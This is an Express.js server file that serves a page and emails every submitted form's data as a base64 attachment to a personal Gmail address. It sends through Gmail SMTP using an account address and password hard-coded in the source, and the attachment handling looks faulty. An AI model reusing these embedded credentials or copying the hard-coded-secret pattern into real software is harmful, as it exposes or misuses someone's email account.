const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", (req, res) => {
  try {
    const data = req.body;

    // create nodemailer transport object
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: "ayomiakintoye00@gmail.com", // your email address
        pass: "mwphwjmkjsiglnoz", // your email password
      },
    });

    // create mail options object
    const mailOptions = {
      from: "ayomiakintoye00@gmail.com", // your email address
      to: "techmornach@gmail.com", // recipient email address
      subject: "Data file",
      text: "Please find attached the data file.",
      attachments: [
        {
          filename: "data.bin",
          content: req.body,
          encoding: "base64"
        },
      ],
    };

    // send mail with defined transport object
    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.error(err);
        res.status(500).send("Error sending email.");
      } else {
        console.log("Email sent successfully.");
        res.sendFile(path.join(__dirname, "confirmation.html"));
      }
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Error saving data.");
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
